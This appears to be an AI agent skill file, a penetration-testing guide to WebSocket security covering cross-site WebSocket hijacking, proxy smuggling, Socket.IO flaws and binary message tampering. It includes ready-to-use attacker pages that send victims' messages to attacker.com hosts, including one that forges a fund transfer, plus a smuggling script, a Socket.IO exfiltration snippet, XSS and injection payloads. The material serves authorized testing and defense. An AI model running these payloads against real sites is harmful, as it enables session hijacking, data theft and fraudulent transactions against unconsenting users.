---
name: websocket-security
description: >-
  WebSocket handshake, CSWSH, tooling (wsrepl, ws-harness, Burp), and common flaws. Use when apps use real-time channels, chat, notifications, or WS-backed APIs.
---

# SKILL: WebSocket Security

> **AI LOAD INSTRUCTION**: This skill covers WebSocket protocol basics, cross-site WebSocket hijacking (CSWSH), practical tooling bridges, and common vulnerability classes. Apply only in **authorized** tests; treat tokens and message content as sensitive. For REST/GraphQL companion testing, cross-load **[api-sec](../api-sec/SKILL.md)** when present in the workspace.

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---

## 6. RELATED ROUTING

- From **[api-sec](../api-sec/SKILL.md)** — authentication, authorization, IDOR, and rate limiting often **mirror** HTTP APIs behind the same WebSocket routes.

**Note**: WebSocket often shares session and permission models with REST; use `api-sec` to align authentication and resource boundaries on the same backend.

---

## 7. CSWSH — STEP-BY-STEP EXPLOITATION

### Step 1: Confirm no Origin check on WS handshake

```text
# In Burp: intercept the WebSocket upgrade request
# Change Origin header to: https://attacker.com
# If 101 Switching Protocols returned → no Origin validation
# If 403/rejected → Origin is checked (test subdomain variants)
```

### Step 2: Craft attacker page

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Connection established as victim (cookies sent automatically)
    console.log('Connected as victim');
    // Send commands as victim
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### Step 3: Cookies and session hijacking

```text
Browser behavior for WebSocket:
- Cookies for the target domain ARE sent automatically in the upgrade request
- SameSite=None cookies always sent
- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)
- SameSite=Strict cookies: NOT sent

Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?
→ Legacy cookies default to Lax in modern Chrome but None in older browsers
```

### Step 4: Read/write messages as victim

```javascript
// Attacker can both READ and WRITE on the WebSocket
// Read: financial data, private messages, admin commands
// Write: transfer funds, change settings, send messages as victim

ws.onopen = () => {
    // Write: perform actions as victim
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // Read: exfiltrate sensitive data
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WEBSOCKET SMUGGLING

### Concept

Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection.

### Upgrade-based proxy bypass

```text
1. Reverse proxy restricts access to /admin (returns 403)
2. Client sends legitimate WebSocket upgrade to /ws
3. Proxy allows the upgrade (101 response)
4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)
5. Client sends raw HTTP request through the "WebSocket" connection:
   GET /admin HTTP/1.1
   Host: backend-server
6. Backend processes the HTTP request → 200 OK with admin content
```

### H2-over-WebSocket smuggling

```text
1. Connect to target via WebSocket
2. After upgrade, send HTTP/2 preface through the WebSocket tunnel
3. Backend HTTP/2 handler processes the smuggled requests
4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic
```

### Implementation with Python

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

# After upgrade, send raw HTTP through the tunnel
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # binary frame
response = ws.recv()
print(response)
```

### Proxy-specific behaviors

| Proxy | WebSocket Tunnel Behavior |
|-------|--------------------------|
| Nginx | Passes raw TCP after 101 — smuggling possible if backend doesn't validate WS frames |
| HAProxy | Depends on `option http-server-close` vs `tunnel` mode |
| AWS ALB | Terminates WebSocket — reframes traffic, harder to smuggle |
| Cloudflare | Inspects WebSocket frames — raw HTTP smuggling blocked |
| Varnish | Does not support WebSocket natively — upgrade may bypass cache entirely |

---

## 9. SOCKET.IO SPECIFIC VULNERABILITIES

### Namespace injection

Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:

```javascript
// Client connects to privileged namespace without auth check
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// Server may not verify that the client is authorized for /admin namespace
```

### Event name injection

If event names are derived from user input:

```javascript
// Server-side vulnerable pattern:
socket.on(userInput, handler);

// Attacker sends event name that matches internal event:
socket.emit('__disconnect');     // force disconnect other clients
socket.emit('connection');        // re-trigger connection handler
socket.emit('error');             // trigger error handler
```

### Acknowledgement callback abuse

Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
# Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

# Output: field structure with types and values
# Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

# Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
# data = {'action': 'get_balance', 'user_id': 123}

# Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
# Original: user_id as integer (field type 0)
# Modified: user_id as string "1 OR 1=1" (field type 2)
# If server doesn't validate types after deserialization → SQL injection

# Original: is_admin as boolean false (0x00)
# Modified: is_admin as boolean true (0x01)
# Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |
